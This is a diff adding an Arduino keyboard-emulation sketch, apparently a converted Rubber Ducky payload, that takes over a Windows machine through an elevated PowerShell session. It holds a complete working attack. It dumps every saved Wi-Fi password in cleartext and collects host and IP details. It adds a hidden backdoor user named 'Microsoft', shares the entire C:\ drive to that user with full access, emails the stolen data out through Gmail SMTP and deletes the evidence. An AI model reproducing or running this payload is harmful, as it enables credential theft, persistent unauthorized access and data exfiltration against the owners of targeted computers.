@@ -1,0 +1,156 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+
+  delay(450);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(450);
+
+  Keyboard.print("powershell Start-Process powershell -Verb runAs");
+
+  delay(30);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  // *****************
+  // # We're going to grab all wifi passwords
+  // *****************
+  Keyboard.print("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > C:\\Information.txt");
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  // *****************
+  // # Now we'll grab Network Information (Local IP, Public IP, Hostname)
+  // *****************
+  Keyboard.print("$command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip}");
+
+  typeKey(KEY_RETURN);
+
+  delay(60);
+
+  Keyboard.print("$command.InvokeReturnAsIs() | Out-File C:\\Information.txt -Append");
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  // *****************
+  // # We're going to add a user
+  // *****************
+  Keyboard.print("NET USER Microsoft \"l33t\" /ADD");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  // *****************
+  // # Now we're going to share the C:\ drive out
+  // *****************
+  Keyboard.print("New-SmbShare -Name \"Microsoft\" -Path \"C:\\\" -FullAccess \"Microsoft\"");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  // *****************
+  // # Let's e-mail ourselves and clean up
+  // *****************
+  delay(1000);
+
+  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo.EnableSSL = $true");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAILHERE', 'PASSWORDHERE!')");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.From = 'EMAILHERE'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.To.Add('EMAILHERE')");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.Subject = 'Hello from the duck'");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$ReportEmail.Body = (Get-Content C:\\Information.txt | out-string)");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  // *****************
+  // # Cleanup
+  // *****************
+  Keyboard.print("del C:\\Information.txt");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("exit");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
